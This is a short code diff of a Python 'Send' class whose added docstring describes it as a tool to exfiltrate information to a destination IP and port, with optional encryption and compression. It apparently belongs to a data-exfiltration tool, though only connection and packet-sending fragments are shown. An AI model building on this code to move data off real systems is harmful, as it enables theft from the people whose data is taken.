@@ -20,9 +20,15 @@ class PortNotAnInt(Exception):
 		return "Exception: %s." % self.message
 
 
-class Send():
-	
+class Send:
 	def __init__(self, dest_ip, key, port, compress=False):
+		'''
+		Send class to exfiltrate information
+		:param dest_ip: Destination IP [string]
+		:param key: Key for encryption [bytes]
+		:param port: Port [int]
+		:param compress: Compress or not [bool]
+		'''
 		self.dest_ip = dest_ip
 		if key is None:
 			self.key = None
@@ -70,7 +76,6 @@ class Send():
 		check = self._establish_connection()
 		if not check: return False
 		
-		# todo: before release change to socket send
 		for packet in send_me:
 			dis_data = bytes(packet, 'utf-8')
 			self.wrapped_socket.send(dis_data)
